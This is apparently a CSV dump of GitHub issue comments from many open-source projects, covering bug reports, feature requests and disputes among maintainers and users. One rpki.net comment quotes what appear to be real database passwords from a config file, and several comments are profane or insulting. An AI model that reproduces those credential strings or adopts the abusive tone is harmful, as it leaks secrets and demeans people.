zfs/zfsonlinux/7401/379842270,zfs/zfsonlinux/7401,I could set up a CentOS 7.4 VM but that could take an hour. Let me know if I should go on or if someone else has a system ready for testing. ,False,True
BotTest/samtstern/39/226428395,BotTest/samtstern/39,"[READ] Step 1 Are you in the right place?  For issues or feature requests related to the code in this repository file a Github issue. If this is a feature request make sure the issue title starts with ""FR"".   For general technical questions, post a question on StackOverflow with the firebase tag. For general Firebase discussion, use the firebase-talk google group. For help troubleshooting your application that does not fall under one of the above categories, reach out to the personalized Firebase support channel.  [REQUIRED] Step 2 Describe your environment  Operating System version _ Firebase SDK version _ Library version _ Firebase Product auth  [REQUIRED] Step 3 Describe the problem Steps to reproduce What happened? How can we make the problem occur? This could be a description, log/console output, etc. Relevant Code ",False,True
ansible/ansible/13262/335252621,ansible/ansible/13262,"The support for looping over includes is the recommended way to achieve this. Take a look at dynamic includes for more detail. If you have any further questions, please let us know by stopping by one of the two mailing lists, as appropriate   - for user questions, tips, and tricks  - for strategy, future planning, and questions about writing code  Because this project is very active, we're unlikely to see comments made on closed tickets, but the mailing list is a great way to ask questions, or post if you don't think this particular issue is resolved. Thank you! ",False,True
bootstrap/twbs/3057/5157624,bootstrap/twbs/3057,JavaScrHiptsters should take note at 03430 and seriously ask themselves the same question. ,False,True
core/owncloud/27775/301107137,core/owncloud/27775,"Same issue here ""sudo apt-get update"" and ""sudo apt-get upgrade"" gives me Reading package lists... Done Building dependency tree Reading state information... Done Calculating upgrade... Done The following packages will be upgraded   owncloud owncloud-deps-php7.0 owncloud-files 3 upgraded, 0 newly installed, 0 to remove and 0 not upgraded. Need to get 27.8 MB of archives. After this operation, 15.6 MB of additional disk space will be used. Do you want to continue? [Y/n] y Err1   owncloud 10.0.0-1.1   404  Not Found [IP 2a014f8130934f3 80] Err2   owncloud-files 10.0.0-1.1   404  Not Found [IP 2a014f8130934f3 80] Err3   owncloud-deps-php7.0 10.0.0-1.1   404  Not Found [IP 2a014f8130934f3 80] E Failed to fetch   404  Not Found [IP 2a014f8130934f3 80] E Failed to fetch   404  Not Found [IP 2a014f8130934f3 80] E Failed to fetch   404  Not Found [IP 2a014f8130934f3 80] E Unable to fetch some archives, maybe run apt-get update or try with --fix-missing? ",False,True
vuejs.org/vuejs/974/313535448,vuejs.org/vuejs/974,Btw if it's any help we have a bunch of accessibility docs available at  and I do a video series where I try to cover common topics  excited to see you all working on this! ,False,True
nixpkgs/NixOS/32080/276843392,nixpkgs/NixOS/32080,"In principle it should be possible to build Bazel from source on macOS. Bazel itself is quite a mess to patch, since  is sometimes invoked from the PATH, sometimes absolutely from , and sometimes via an  script. What has me stumped is that Bazel grabs a bunch of dependencies whose build systems also rely on , particularly protobuf and grpc. Many of the calls don't straightforwardly do something like , but instead query various SDK locations and feed them into further wrapper scripts. Unfortunately the only success I've had has been allowing these build systems access to . For my use case an impure-but-working Bazel derivation on Darwin is better than no working Bazel derivation on Darwin, especially considering that the impurity is confined to Xcode's CLT and libraries. From what I understand there are two reasonable paths forward.  Accept this impurity on Darwin, but do so in a principled way. Surely there's some existing idiomatic way of doing this. I've seen mention of a ""pure Darwin stdenv"" and an ""impure Darwin stdenv"" in discussions elsewhere, but I can't seem to find any documentation on these.  Build some heavyweight hacks into the Bazel build system. This might be something like inserting extra machinery to patch the external dependencies that Bazel grabs, or perhaps writing a fake  command. I think this would involve a lot of work for questionable benefit; because of Xcode it seems that larger degree of impurity tends to be acceptable when it comes to Darwin in Nixpkgs at large.   @friend and @friend, I'm curious about your thoughts. ",False,True
termux-packages/termux/2735/413329366,termux-packages/termux/2735,"I must disagree with your biased hair raising conclusions; Sorry to dissent. I disagree with your opinions wholeheartedly (learn to punctuation properly, then maybe we can talk). ",False,True
bootstrap/twbs/9501/30242395,bootstrap/twbs/9501,plus one really don't understand why this was dropped without a reasonable alteranative. ,False,True
jekyll/jekyll/6948/387239592,jekyll/jekyll/6948,"When I see the repo, I though GitHub pages. It has similarity between. ,  etc.. ",False,True
Kosmos/AtlasNX/187/466729376,Kosmos/AtlasNX/187,Implemented in latest release v11.10.0 ,False,True
coffeescript/jashkenas/4056/127854948,coffeescript/jashkenas/4056,npm is just not the right tool for the job here. Bower or cURL/tar are what you want. ,False,True
SevTech-Ages/DarkPacks/2977/399713194,SevTech-Ages/DarkPacks/2977,"I mean concerning the issue of SevTech not explaining things but rather assuming the player knows or can easily figure them out, that is a bit of a problem. I had plenty of instances where how to do something simple wasn't detailed anywhere in SevTech, and I find myself constantly googling things from specific mods in order to use them. Most recent example would be making stabilized metal with an arc furnace. JEI only says I needed a hardened mesh, iron, and some refined hardeners. All JEI showed was that I needed all three in the same place, but it turns out the refined hardeners needed to be in the modifiers slots along with the iron ingots. Never would I have guessed that iron ingots were NOT what was being melted down to make stabilized metal, and instead were put in the modifiers slots instead of the smelting spots. I spent over an hour and a half pulling my hair out. Google was of little help this time because the recipe is different in SevTech than what it showed elsewhere and I had to eventually just rummage through random youtube videos concerning steve's carts until I noticed one from a streamer involved an arc furnace, and surprise surprise he spent almost half an hour on the stream trying to figure out how to make stabilized metal. Only when he eventually discovered iron ingots needed to be on the right slots instead of the left in the arc furnace was I then also able to continue with it myself. There's like, probably a dozen examples of SevTech progression-related advancements where it just says ""do this thing with this mod"" but it doesn't tell you how, or always give you that mod book. There's a few books from mods that you have to craft in order to try and learn about that mod. It doesn't help that SevTech starts off by giving you these books when you reach those points for free, and then stops entirely leading the player to believe there IS no book to help with that mod when in fact there is, you just need to browse JEI until you find it and craft it.  There's a lot to complain about in terms of SevTech teaching players what to do. Not just in the first two ages either. I'm in age 4 and pausing the game to go spend half an hour googling information that isn't obvious or clear to me in order to progress or acquire something exceedingly valuable is simply par for the course at this point. I've gotten used to it and I never thought about how stupid it was. It do in fact hate games that make me stop playing them in order to figure out how to continue playing them. A modpack for a game like Minecraft was probably always going to entail this, though. As for the I actually disagree. All those extra advancements are more a quality-of-life thing. They are pointless in the same vein that the mushroom islands or woodland mansions are pointless in vanilla minecraft. If you consider defeating the Ender Dragon and watching the end credits to be the ultimate goal, then there's an ENORMOUS amount of stuff in vanilla miencraft that's pointless, and only there if you want it or find it fun to invest your time into. SevTech does this but on steroids. I've skipped kitten kaboodles of advancements because they didn't interest me. Literally never even touched Steve's Carts. Didn't even make a cart or use any of the mod at all. Only acquired stabilized metal to get a mob duplicator for my mob farm.  I think that's fine. It allows you to select what you want to do, and only rarely forces you into mundane or tedious vague bullshit as a requirement to progress OCCASIONALLY.  For the most part, the age-progression content is straightforward enough. There's nothing wrong with focusing on ONLY the age progressions. I for one played that way intentionally for a good while, thinking once I had enough stuff unlocked, I'd simply come back and browse what I wanted, getting it later, which is in fact now what I'm doing; building a massive sky castle that will have absolutely everything I could possibly want or need now that the majority of SevTech and its mod contents are available to me.  If you were hoping for progression where you only advance after doing 100% of everything in that age, I would argue you don't know what you're asking for, because during age 0 and 1, I thought that's what I had to do (again because SevTech never told me that age progression advancements had a unique shape to their advancement icons) and it was a tedious nightmare doing this and finding that and completing something I cared nothing for just to try and continue. Overall SevTech isn't really good for player's who aren't already at least relatively familiar with a large handful of mods. It requires homework outside of the game in order to keep going further, yes. I don't like it much either in that manner. It's more a serious of mods strung together with the idea of one unlocking the next, rather than something that was delicately crafted to provide the player the complete and total experience from several of the best mods available in the pack in as smooth and convenient a way as possible. ",False,True
manageiq/ManageIQ/1210/66506586,manageiq/ManageIQ/1210,"Note, below that the same seed fails in different iterations of the test. ` ",False,True
rdpwrap/stascorp/601/447727460,rdpwrap/stascorp/601,"Hi, you people are awesome, but there may be some n00bs like me (relatively speaking) out there getting a bit lost. Here are some streamlined instructions based on hajubu, RobertSpir, Scr34mik, et. al., which worked for me. This is for those who have already installed 1.6.2 using the install.bat file and RDPWInst.exe.  Open C\Program Files\RDP Wrapper Copy rdpwrap.ini file to somewhere like the desktop Open that file and add the following text to the end   Open cmd as admin and enter ""net stop TermService"" Go back to C\Program Files\RDP Wrapper and rename or delete rdpwrap.ini file. Move the newly edited rdpwrap.ini file to C\Program Files\RDP Wrapper Open cmd as admin and enter ""net start TermService""  That should work. Thanks for keeping this going! ",False,True
ansible/ansible/13262/290258206,ansible/ansible/13262,"@friend Greetings! Thanks for taking the time to open this issue. In order for the community to handle your issue effectively, we need a bit more information. Here are the items we could not find in your description  component name  Please set the description of this issue with this template  here for bot help  ",False,True
docxtemplater/open-xml-templating/184/119674874,docxtemplater/open-xml-templating/184,I want to to a two pass templating. One pass done days before the second pass. So in the first pass I first tried not specifying the placeholders I did not want replaced. I expected the placeholders to be left as they are. Instead they got replaced by . It would be much better for my usecase if docxtemplater leaves the placeholder in place instead of inserting . Then I tried replacing the placeholder with itself (to not touch it until the second pass) And the I get this error ,False,True
Elgg/Elgg/12126/408829744,Elgg/Elgg/12126,"Trying to upgrade 2.3 to rc1 is a total failure... I made a fresh install with 2.3.8 and then tried to upgrade it to rc1 directly. But I only get a WSOD and a critical error in error log telling me that ""Site secret is not set"". I don't see a way to continue testing with this error. Maybe one question should I have commented out the $CONFIG-&gt;dbencoding line in settings.php before running upgrade.php? Though I'm not sure if upgrade.php did anything at all. Anyway, how to deal with $CONFIG-&gt;dbencoding is not really clear to me as the upgrade docs don't even mention it while the comment in settings.php tells me I would have to convert tables to utf8mb4 manually - which is not explained anywhere either. ",False,True
core/owncloud/27775/301328929,core/owncloud/27775,quality in this project != quality of the repository 😄 Two different things and IMHO the OBS repositories should be dropped completely as a software project like ownCloud never should be responsible and provide linux repositories for such a large amount of different linux distros. ,False,True
angular.js/angular/9004/55962702,angular.js/angular/9004,@friend  do you think it would be reasonable to integrate @friend's PR in one of the 1.3 release candidates? Shall we wait or just manually apply a patch for our product for the weeks to come? ,False,True
spark/perwendel/1020/328394688,spark/perwendel/1020,"I hava a 512m vps, I want to build some website on it. memory is too small, I must select a simple and high performance java web framework. I just read the spark's doc, I found some code like this Do you know what's the feeling of me?  foolish, child-liking ,  naive I want a normal code style like this You all contributors should focus on simple and performance and low memory-use, not the  naive grammar features! ",False,True
hoverfly/SpectoLabs/821/469246117,hoverfly/SpectoLabs/821,@friend I suppose my real question is why doesn't Squid (or something like that) do what you want? ,False,True
bootstrap/twbs/3057/5178081,bootstrap/twbs/3057,"@friend so makers of Prototype.js, underscore.js and bootstrap value code beauty over utility? Well, you seem to know these people very well; I can't comment on that. However, you calling a programming language (which also happens to be the number one on GitHub, even though it doesn't need to be) ""excrement"" tells a lot about your ""painting skills"" =) ",False,True
puppeteer-sharp/kblok/736/436709027,puppeteer-sharp/kblok/736,That's the awnser for last question. What about the code? ,False,True
react-popper/FezVrasta/111/379497112,react-popper/FezVrasta/111,"It's still a problem of the sharepoint configuration, I mean, I don't even know what it's it, but if it happens only with it there must be a reason I guess? How do you expect me to change the name of a file used in the library just because your configuration is trying to import stuff from where it's not supposed to? ",False,True
franz/meetfranz/574/357527034,franz/meetfranz/574,"closed for obscenity, please use constructive criticism ",False,True
vuejs.org/vuejs/974/239224881,vuejs.org/vuejs/974,"React just added a section to their docs on accessibility, and it's pretty nice  think Vue should have a page too! (and I'm happy to write it) Proposed structure  Introduction - why accessibility matters Basic accessibility measures Introduce the WCAG guidelines Highlight a few of the important ones   Accessibility in SPAs Content that relies on the mouse (menu bars, dropdowns, controls on mouseover) Extended input elements Dynamic content (notifications, error messages) and aria-live Announcing page navigation   How to test accessibility  Very high-level overview of what I think we should have - any thoughts before I start writing? ",False,True
cryptsetup-deluks/kriswebdev/6/459256673,cryptsetup-deluks/kriswebdev/6,"@friend Hey man, do I need to first install DragonFlyBSD then I can set up deluks or do I first set up deluks then DragonFlyBSD? ",False,True
documentation/nextcloud/1142/454314327,documentation/nextcloud/1142,"The executable bit should not be needed, because it is called with  infant, which leaves to permissions like  ( minus the executable bit), which is then only a diff of the read permission for others, which should not be needed as you are  and thus the owner. Could you do an  in the directory to check what are the specific permissions and owners? Maybe the find command is slightly off. And on what operating system was this executed? ",False,True
angular.js/angular/1463/71796849,angular.js/angular/1463,"@friend - I hope this is the right place to ask for it, but with the fix of ""only stripping""  attributes, angular now sends  and  attributes back to the server. What is the recommended way of stripping of these attributes now?  (our JAX-RS Json to object mapping doesn't like them). Thanks for any recommendation. ",False,True
serverless-stack-com/AnomalyInnovations/63/359190772,serverless-stack-com/AnomalyInnovations/63,"Should maybe add --delete to ♠aws s3 sync build/ s3//YOUR_S3_DEPLOY_BUCKET_NAME --delete` So that the changes don't accumulate. Before I did that, earlier versions were buffered and the correct version was not always rendered. ",False,True
code-d/Pure-D/29/183007674,code-d/Pure-D/29,"hm the plugin definitely receives and parses the completion correctly. Also those logs are near the callback passing the arguments back so vscode should receive them correctly. It should be an issue with vscode, did you try closing the file at the top left and reopen it? ",False,True
bety/PecanProject/568/362114126,bety/PecanProject/568,"took an exisiting instance of pecan, switched to this branch, ran set the secret key and now I end up with an error, no log files. Not sure what to do next, I can show it after the TERRA meeting. ",False,True
GSM_AT_commands_parser/MaJerle/5/200647333,GSM_AT_commands_parser/MaJerle/5,"Hello Tilen, I want to ask you, if can i upload any type of file with this drivers? pdf, doxc, jpg ... Best Regards, Saif ",False,True
Osmand/osmandapp/3663/294364603,Osmand/osmandapp/3663,"See ""Take the right hand road"" then.  Unless you want OSMand to give pace notes (which, to be honest, I would be -very- for ;-) ) Perhaps not on the roads you are on.  But on the roads I drive, there are motorway exits every couple of miles. And, if you'll note, I did stress that I suggested it be an -option-.  All your arguments are for what -you- want, which is also what I'm suggesting, so thanks for backing me up -D ",False,True
ansible/ansible/13262/173885814,ansible/ansible/13262,plus one for this feature. ,False,True
jekyll/jekyll/6948/389749422,jekyll/jekyll/6948,Can you add a bit more detail here? How is this different from the current state? ,False,True
angular.js/angular/1463/45025155,angular.js/angular/1463,"when did this get triaged as high priority? should try to get this checked in, imo. @friend --- I don't know if that's necessarily the best way to do it, but I think it would be okay if we only removed , and maybe some of the scope properties. However I think scope parameters are unlikely to be serialized as you generally don't send an entire scope to the backend, so it's probably not even worth worrying about. AFAIK,  is the only property which angular should add to objects that you might actually want to send off. ",False,True
serverless-stack-com/AnomalyInnovations/63/351417334,serverless-stack-com/AnomalyInnovations/63,@friend I manage to get it working ! So thank you for the help ) ,False,True
forum/standardnotes/39/441378976,forum/standardnotes/39,"Okay, that's encouraging enough to jump in on the Black Friday deal! I'll keep pitching the ""create note from search bar"" feature, which I also found in #340. Thank you. ",False,True
GRDB.swift/groue/261/344972349,GRDB.swift/groue/261,"Try downloading and re-importing the latest code build, updating cocoa pods, cleaning your project and restarting xcode. Also, make sure you refresh your frameworks in your build settings. I didn’t want to leave up an answer as the maintainer seemed angry. Hope that helps. Thanks, Sarah ",False,True
zfs/zfsonlinux/8259/453353256,zfs/zfsonlinux/8259,please don't post meaningless comments. ,False,True
pycodestyle/PyCQA/703/370217530,pycodestyle/PyCQA/703,"doesn't mean the same thing as  in Python 2; in Python 2 you could raise old-style classes as exceptions, which do not inherit from BaseException. Regarding ""I could never imagine a situation where I'd want to unconditionally clean up in the case of any exception""  In the case of temporary files, never leave them around on a production server because they can cause additional impact (eg. filling a disk volume) which can be much more serious than the original crash. Reproduce the issue in dev and diagnose. Just came across another example in the case that my event loop crashes due to programming error, I must kill my subprocesses which are now in an unknown state code.  ",False,True
msgpack-python/msgpack/305/401710780,msgpack-python/msgpack/305,"So you must ask question on Stackoverflow. Posting question on here means you send spam notification to me. README is very short entry point for new users, not full document.  You must read docstring and  bad English writer, contribution on document is welcome. I respond already.  It's compatibility with JSON and strict_types allows you to use . ""object"" in  is JSON's object, you must understand it if you read JSON API document. You must use your time before respond so quickly. Or you should use Stackoverflow to get reply from kind volunteer for you.  I'm not. ",False,True
asmjit/asmjit/231/455801897,asmjit/asmjit/231,Cheap shot dude... ,False,True
bootstrap/twbs/13327/40259544,bootstrap/twbs/13327,"works just fine in our docs, even when I switch to our non-minified CSS, so the problem would appear to be on your end somewhere. We also don't support build systems other than our official Grunt one. ",False,True
rpki.net/dragonresearch/198/238309972,rpki.net/dragonresearch/198,so now we can log into mysql as the rpki user.  but we believe that the rpki.conf shared_sql_password was compiled into some code somewhere.  and we do not know where to find it. Trac comment by randy on 2015-08-06T073335Z ,False,True
Elgg/Elgg/2553/13660163,Elgg/Elgg/2553,Attachment added by trac user dannyl on 40786983-07-09 security_tokens_by_parameter.php ,False,True
code-d/Pure-D/29/410789384,code-d/Pure-D/29,"it's been two long years and still having this ""loading"" problem Cmon,it's a very simple looking bug that should have been fixed by now -1 -1 ",False,True
jekyll/jekyll/6948/385857693,jekyll/jekyll/6948,I would like to see the tags of collections included in site.tags. Thanks! ,False,True
moby/moby/20303/133481954,moby/moby/20303,"I just hit almost the same issue as #14363 (mine reads ""ApplyLayer exit status 1 stdout stderr chmod /bin/mount permission denied"") , also under Gentoo. It is related to the use of the kernels built with  such as Gentoo's  package. After some digging, I changed the following This appears to fix the problem, but hits another problem more like that shown in #14363, ""ApplyLayer exit status 1 stdout stderr operation not permitted"". So I tried adding the following from #14363, just to test if it works. (Note that disabling this option appears to be a very bad idea from a security standpoint!) The result was that it worked. To save anyone the hassle in future, Docker could check for the existence of  and  and, if present, ensure the values of both are 0. ",False,True
fullcalendar/fullcalendar/3046/186749698,fullcalendar/fullcalendar/3046,would you mind posting a JSBin with a recreation of the bug? instructions ,False,True
core/owncloud/26374/253943443,core/owncloud/26374,no support at all then ? I provided a lot of information ... Should I move to nextcloud then ? (((( ,False,True
vuejs.org/vuejs/974/369081536,vuejs.org/vuejs/974,"I don't believe those attributes end up in the accessibility tree generated by the browser. So I don't see any evidence to support the claim that they harm any assistive technology, in any case, in any browser. That doesn't mean that don't, I just haven't seen any evidence supporting that. Yes it might. My understanding is that it's up to the firm doing the audit to interpret the rule and say whether it's an actual violation or not. 4.1.1 seems like its intent is to prevent developers from accidentally breaking the page structure with unclosed tags or typos. If what Vue is doing does not actually have any negative, or even perceivable, impact on the user experience, then the auditors may decide that it's not a violation. Again, it's up to how strictly those folks wish to interpret the rule. ",False,True
NanoCore/NanoAdblocker/87/356447669,NanoCore/NanoAdblocker/87,"it depends on how the internal data structure of the core looks like if the rules still have a reference to the list they came from then it shouldnt be too hard to just ignore them on a specific website just like you can switch off blocking completely for a site. if the internal structure is just a huge merged and optimized set of rules, which i assume is the case, then you would have to rebuild that internal structure once you click on that button or when you later load that site again or if you leave and all filterlists should be on again. if the performance hit is too great then there are two ways to deal with it. generate an internal structure for each new combination of active lists and keep it for later or use the normal datastructure when all lists are on and if one or more are disabled then execute each least sequentially. this could behave differently than a combined list, like you mentioned, so maybe some sort of hybrid would be needed. so, yeah, not an easy task if my assumptions about the project are correct. but it would still be a very worthwhile feature that you shouldn't give up that easily. maybe gorhills rework of the engine makes this easier to implement. ",False,True
serverless-stack-com/AnomalyInnovations/63/371610065,serverless-stack-com/AnomalyInnovations/63,@friend No worries. We might have addressed this somewhere else. But the notes app is a single page app and it is not meant to be publicly accessible (it's behind a login). So it isn't really SEO friendly. Are you wanting to remove the login and make it publicly accessible? ,False,True
nativefier/jiahaog/29/204726970,nativefier/jiahaog/29,Maybe you need to use inspectServiceWorker() instead of toggleDevTools()? ,False,True
rpki.net/dragonresearch/198/238309994,rpki.net/dragonresearch/198,"polluted machine not likely, as we would destroy old vm, create new vm from a prototype that had never hear of rpki. though we did carry the rpki.conf around.  and it had that long auto- generated shared_sql_password {{{ shared_sql_password             = wOnoHHYNfhec7-Gm2SJ5e_PxBkniAjA6NNrlqq2LeDyXJsRbswlCJbOUPw4FAqnUdn9THR-4x0nagTbdtoG-1X4C shared_sql_password             = di2lbEw51 }}} but we dug ourselves out of this one.  so it is no longer blocking. Trac comment by randy on 2015-08-06T150618Z ",False,True
SevTech-Ages/DarkPacks/2977/401589794,SevTech-Ages/DarkPacks/2977,"Well I mean... and only later do we discover that there's apparently a tool in age 0 that takes the leaves off of a large area of trees in almost no time.` Eeeeeyup. Definitely everything SevTech is about. It's a Minecraft-themed Homework Simulator.  When I was getting through age 3, I was making a bee-line for the age advancements to breach age 4, hoping blindly it would unlock diamonds by age 4 because why in the world would diamonds be exclusive to an age that prioritizes space travel? How are diamonds more valuable than literal rocket-science?  I wanted them because in the Cyclic book, I read about diamond spikes, which were the first item I discovered that apparently would act as a player-kill. Already having a small, rather inefficient mob farm built by that point, all I wanted were those diamond spikes so I could turn my mob farm into an experience farm as well. Come age 4 after some grueling and nightmare-ish progression grinding and googling and video watching and building and rebuilding when I realize I built it wrong and all the hullabaloo that comes with stupidly vague SevTech progression... I discover diamonds are in fact age 5 not 4, but browsing through JEI, I noticed mob grinding utils is now unlocked... which comes with mob-killing items that drop experience, and dark utilities now has a ""player trap"" which does the same thing as diamond spikes.  My ultimate goal was wisped away from me due to lack of SevTech information, and then immediately returned to me through another avenue via lack of SevTech information.  This is unfortunately how the whole experience is, honestly. You will have a suckish time if you don't constantly browse and research what is newly available. SevTech seriously seriously VERY EXTREMELY BADLY NEEDS a feature where it lists to you all the items unlocked by age, and also provide links to resources players will end up likely googling anyway just to try and learn more about a mod they are using. Since SevTech has so many mods, it needs to compensate for this massive overflowing incline of a learning curve it now results in, and provide players something more comprehensive.  Something to list what each age unlocks (only available after you reach that specific age). Way more detail about where to find more information concerning a mod (I.E. does the mod have a book the player can craft? Or should they default to googling and thus be provided a link from an in-game description instead?). SevTech is very anti-player-friendly.  Though to be honest, apathetic-looking github management and poor/nonexistent in-game teaching methods aside... I just want the damn modpack to work again. Seriously, whatever happened with the 3.0.8 update has made it so incredibly unfun to play SevTech with how unstable it is now that I may not ever have the motivation to actually make it to age 5.  Literally a complete rollback to 3.0.7 would be 100% acceptable to me at this point, because at least the modpack can be played in a heavy setting again, such as large builds or complicated surroundings (which, you know... age 4 and 5 will basically demand from the player anyway). Unfortunately, we may just be barking at a bush from the perspective of the people involved in sevtech development. If it was made primarily to meet a specific guy's standards, I doubt anybody but him coming forward and saying ""shit needs a lot of work, yo"" is gonna do anything besides fall on deaf ears. ",False,True
code-d/Pure-D/29/182582997,code-d/Pure-D/29,I update workspace-d now and now i get  in visual studio code. my user settings are the log looks like ,False,True
flood/jfurrow/758/457869384,flood/jfurrow/758,"@friend Please also read the CODE_OF_CONDUCT and do not PM people on discord, you have the issue tracker and the discord server to do so. ",False,True
Elgg/Elgg/6779/41463113,Elgg/Elgg/6779,"I am strongly opposed to any more of UI JS in core. Aalborg does what it says - it's responsive. These libs are like weed, impossible to get rid of in a custom project (looking at fancy box/color box) ",False,True
bootstrap/twbs/9501/34351298,bootstrap/twbs/9501,@friend You're an exceptional communicator and I'm glad you're maintaining something I depend on. ,False,True
SickChill/SickChill/5159/437629006,SickChill/SickChill/5159,3rd party already support these features. We have had these features for more than 5 years. ,False,True
bootstrap/twbs/3057/5160583,bootstrap/twbs/3057,More like ,False,True
zfs/zfsonlinux/7401/379827550,zfs/zfsonlinux/7401,"@friend My tentative understanding is that If ENOSPC did not occur, the data should be fine. I suggest downgrading to 0.7.6 for the time being though. ",False,True
TotalFreedomMod/TotalFreedom/2004/302300863,TotalFreedomMod/TotalFreedom/2004,The simple patch fix is to change this line ( to ,False,True
flood/jfurrow/240/204797360,flood/jfurrow/240,I know this is well rooted in your app but I would very much like to disable auth / passport and use basic auth on my reverse proxy instead. Thanks! ,False,True
xregexp/slevithan/146/243067377,xregexp/slevithan/146,"thanks, I misunderstood the exec() description's ""match array"" (correct term though, just misguided expectations for its meaning) ",False,True
dataverse/IQSS/1513/239558321,dataverse/IQSS/1513,"This is working now. Phil, we can close this unless there is something more you want to do. ",False,True
ceph/ceph/12105/261989390,ceph/ceph/12105,"with this fix applied, test_multi.py can now run to completion ",False,True
ansible/ansible/13262/235252391,ansible/ansible/13262,To enhance playbook's performace I've rewritten it with but the with_indexed_items return the following alert executing for hosts that doesn't match the block's when Do you have any suggestions to bypass this behaviour (I think with_indexed_items evaluated before when clause)? Thanks ,False,True
jekyll/jekyll/6948/384634593,jekyll/jekyll/6948,"Hello all, my first post so go easy. I want to just say that I love Jekyll, I'm now using it on a lot of my web builds. One thing that has bothered me though, is that I've not been able to take advantage of the latest Jekyll features because a lot of the 3rd party CMS solutions I rely on for my clients use (cloudcannon, siteleaf and forestry) simply don't run the latest versions of Jekyll themselves. This forces me to have my folder structures in a really messy state and not take advantage of the latest features when developing locally. So if anyone at Jekyll could bend a few arms to get them to update that would be fab. ",False,True
SevTech-Ages/DarkPacks/2977/401280539,SevTech-Ages/DarkPacks/2977,"In my opinion, PrimalCore and Immersive Craft are mostly meant (and to some extent Embers, Immersive Tech, Blood Magic -- basically anything without a GUI) to be used with VR goggles. What otherwise is tedious to use becomes the more agreeable way with VR. ",False,True
rdpwrap/stascorp/645/456318244,rdpwrap/stascorp/645,"I've exactly the same version, not supported. ",False,True
eXpand/eXpandFramework/176/425669723,eXpand/eXpandFramework/176,It is a real use case when the whole purpose of import is only to update large amount of records and keep track of errors that did not go through. ,False,True
Elgg/Elgg/6779/41481053,Elgg/Elgg/6779,"I definitely care not for Opera. I think it's best to leave UI as is in 1.9. It serves its purpose enough. Everything else can be implemented in a plugin. This doesn't affect an average user, and the developer will find a workaround if need be On Apr 26, 2014 645 PM, ""Evan Winslow"" notifications@friend.com wrote ",False,True
bootstrap/twbs/7482/15983697,bootstrap/twbs/7482,"I didn't say I didn't care, I said I'm not too concerned about it for this particular convention. To me, this is a good (and practical) practice that folks already use regardless of the spec. And having just reread the spec and their examples, I think you're mistaken on the validity of this convention. Take a look at that first example—sounds like a perfect use case that parallels our code. ",False,True
ansible/ansible/13262/193668973,ansible/ansible/13262,plus one For all types of loops! ,False,True
All-the-Matrices-back-end/EricLScace/29/310886436,All-the-Matrices-back-end/EricLScace/29,"Until API change (issue #120), will limit this to change of password. ",False,True
bootstrap/twbs/3057/5206834,bootstrap/twbs/3057,"Over 200 comments over a missing semicolon?? For fuck's sake people, don't you have any work to do?! ",False,True
i2cdevlib/jrowberg/252/350210079,i2cdevlib/jrowberg/252,"Solved, it was something I did wrong with the wiring; when I power separately the servos and arduino (with the usb cable) works like charm. Many thanks Jeff Rowberg, keep up with the good work!! ",False,True
bootstrap/twbs/24475/339420991,bootstrap/twbs/24475,"I've tried to optimize the way code snippets can be handled in templates. For the insertion of variables into the code snippets we could add a template function that takes a string and the current context. The string gets parsed as a template in which the variables () are replaced with the values from the passed context. This could look like this {{ render ""code snippet with variables"" . }}  However, I wasn't able to create multiline strings in Go templates that preserve line breaks, not even with backticks. Hence  can't passed as follows ",False,True
Terra/ObliqueNET/139/455230992,Terra/ObliqueNET/139,"Couple things missing from your ban appeal - your username, the ban reason when you try to connect, and how long ago your ban started. I literally cant tell with what you have provided so far. ",False,True
qTox/tux3/600/47534192,qTox/tux3/600,"↑ Ring to peer, peer rejects call, after that qTox shows ↓  ",False,True
AKS/Azure/287/378799959,AKS/Azure/287,"In the roadmap, about 6 months ",False,True
core/owncloud/3585/18877087,core/owncloud/3585,This is not how you should handle a bug report... ,False,True
core/owncloud/27775/397456674,core/owncloud/27775,I wake up the thread since I got the same error some months ago (but did not look for a solution until today) and none of the proposed solutions here worked for me. I had to modify  from to Now update/upgrade runs with no problem. ,False,True
puppeteer-sharp/kblok/736/436715912,puppeteer-sharp/kblok/736,"Even that, in this situation, it needs to return the page or it will wait forever ",False,True
bootstrap/twbs/3057/5140961,bootstrap/twbs/3057,"Wow, @friend is such a brogrammer ",False,True
jekyll/jekyll/6948/389244841,jekyll/jekyll/6948,"Would love to see a standardized implementation of a service worker built into Jekyll utilizing the methods in The offline cookbook. A way of configuring it so that you could easily designate what the 'shell app' is so that those files load from offline cache first, and then designating dynamic content (such as blog posts) that load from network first and only cache so many entries (since caching 100 blog posts is ridiculous). I realize these things can be done now, but finding a way to configure it to work perfectly with Jekyll would be amazing and save a lot of people the struggle of figuring out how to properly implement a service worker for it. ",False,True
manageiq/ManageIQ/1210/67519572,manageiq/ManageIQ/1210,"@friend haha.... So a ""good"" run in our environment looks like the following.  Notice that for descendants the Default is always first which is the expectation. And here's a ""bad"" run.  Notice that the Default is not first.  I even noticed that in the ""good"" run, all_resource_pools_with_default did not have the Default first which I would have expected, but isn't technically required there. ",False,True
serverless-stack-com/AnomalyInnovations/63/371801516,serverless-stack-com/AnomalyInnovations/63,"Hi @friend, I'm planning to build a mortgage comparison website. Yes it will be publicly accessible. I was thinking to build it with a similar stack as in this example. But I am not sure if google bots will be able to read the content of my pages and index it so people can find it when they search the words like 'mortgage calculator' ... ",False,True
PanDA-NGE/ATLAS-Titan/8/315218539,PanDA-NGE/ATLAS-Titan/8,To be included in Agenda for Ruslan vist ,False,True
vuejs.org/vuejs/974/369083081,vuejs.org/vuejs/974,"If I want to choose between angular or vue I am not going to investigate source code of all existing browsers to find some ""evidence"". As a developer I am looking if the framework requires not valid HTML.  vue encourage using not valid HTML -&gt; that causes problems with IDE, with WCAG compliance, with validation tools  etc etc etc So that means I would prefer to avoid using vue until HTML attributes are fixed. ",False,True
find-and-replace/atom/322/357739728,find-and-replace/atom/322,Statistics also shows that the 'Quit' is used seldom. At most once per session.... ,False,True
lxqt/lxqt/1628/441132875,lxqt/lxqt/1628,One addition - had a bug filed today in debian against pcmanfm-qt  Don't patch things if a configuration file in a common place is sufficient. ,False,True
hoverfly/SpectoLabs/821/474695139,hoverfly/SpectoLabs/821,"John, we want that hoverfly-java should check the status of real service if service is up then hoverfly- Java should be goes into capture mode but status of real service is down then hoverfly-java should be goes into simulation mode how can we do this. ",False,True
